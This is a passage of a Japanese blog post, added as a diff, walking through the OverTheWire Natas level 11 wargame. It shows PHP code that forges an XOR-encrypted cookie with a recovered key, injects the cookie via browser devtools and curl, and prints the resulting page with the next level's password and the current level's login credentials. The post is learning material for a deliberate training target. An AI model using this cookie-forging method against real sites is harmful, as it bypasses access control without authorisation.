+    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$key</span> <span class="o">=</span> <span class="s2">&#34;qw8J&#34;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;showpassword&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;yes&#34;</span><span class="p">,</span> <span class="s2">&#34;bgcolor&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;#ffffff&#34;</span><span class="p">)),</span> <span class="nv">$key</span><span class="p">));</span>
+</code></pre></div><p>実行するとCookieの値がわかりました。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;showpassword&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;yes&#34;</span><span class="p">,</span> <span class="s2">&#34;bgcolor&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;#ffffff&#34;</span><span class="p">)),</span> <span class="nv">$key</span><span class="p">));</span>
+<span class="nx">ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</span>
+</code></pre></div><p>あとはCookieの値を書き換えてあげましょう。
+やり方は以下の2つがあります</p>
+<ul>
+<li>Chromeの開発者ツール</li>
+<li>curl</li>
+</ul>
+<h4 id="chromeの開発者ツール">Chromeの開発者ツール</h4>
+<p>デベロッパーツールのコンソールで以下を入力します</p>
+<pre><code>document.cookie=&quot;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&quot;
+</code></pre><p><figure style="flex-grow: 210; flex-basis: 504px">
+		<a href="/post/over-the-wire/natas/level10-11/level11/a2.png" data-size="2560x1218"><img src="/post/over-the-wire/natas/level10-11/level11/a2.png"
+				srcset="/post/over-the-wire/natas/level10-11/level11/a2_hude26a41a55b6a82c1e132de10aca507c_421389_480x0_resize_box_2.png 480w, /post/over-the-wire/natas/level10-11/level11/a2_hude26a41a55b6a82c1e132de10aca507c_421389_1024x0_resize_box_2.png 1024w"
+				width="2560"
+				height="1218"
+				loading="lazy"
+				alt="入力">
+		</a>
+		
+		<figcaption>入力</figcaption>
+		
+	</figure></p>
+<p>そしてF5で更新するとパスワードが表示されます</p>
+<p><figure style="flex-grow: 194; flex-basis: 466px">
+		<a href="/post/over-the-wire/natas/level10-11/level11/a1.png" data-size="2560x1318"><img src="/post/over-the-wire/natas/level10-11/level11/a1.png"
+				srcset="/post/over-the-wire/natas/level10-11/level11/a1_hu99ec95ebe0c30832bf95d59bc787d12e_880273_480x0_resize_box_2.png 480w, /post/over-the-wire/natas/level10-11/level11/a1_hu99ec95ebe0c30832bf95d59bc787d12e_880273_1024x0_resize_box_2.png 1024w"
+				width="2560"
+				height="1318"
+				loading="lazy"
+				alt="デベロッパーツールでの表示">
+		</a>
+		
+		<figcaption>デベロッパーツールでの表示</figcaption>
+		
+	</figure></p>
+<h4 id="curl">curl</h4>
+<p><code>-b</code>でCookie情報のファイルを指定できます。上述で作成した<code>Cookie.txt</code>のデータ部分を<code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>に変えてcurlしてみるとパスワードが取得できます。</p>
+<pre><code>$ curl -b cookie.txt -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK  http://natas11.natas.labs.overthewire.org
+&lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas11&quot;, &quot;pass&quot;: &quot;U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK&quot; };&lt;/script&gt;&lt;/head&gt;
+
+&lt;h1&gt;natas11&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+&lt;body style=&quot;background: #ffffff;&quot;&gt;
+Cookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt;
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3&lt;br&gt;
+&lt;form&gt;
+Background color: &lt;input name=bgcolor value=&quot;#ffffff&quot;&gt;
+&lt;input type=submit value=&quot;Set color&quot;&gt;
+&lt;/form&gt;
+
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h2 id="おわりに">おわりに</h2>
+<p>今回は色々収穫ありでした。PHPを読んで問題に答える形式が多くなっているので、どんどんPHPに慣れることができます。インタラクティブシェル(<code>php -a</code>)に触れました。次は気軽にPHPのスクリプトが書けそうです。ローカルでPHPファイルを実行する方法も機会があったら学びたいです。</p>
+<p>また、XOR暗号とても勉強になりました。自分でもこのアルゴリズムをかければよかったのですが、今回は回答を見て勉強します。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/natas/level7-9/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Natas: Level7〜9</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/natas/level4-6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Natas: Level4〜6</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/natas/level2-3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Natas: Level2〜3</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/natas/level0-1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Natas: Level0〜1</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/bandit/level33-34/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Bandit: Level33〜34</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2021 ただくんぶろぐ
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
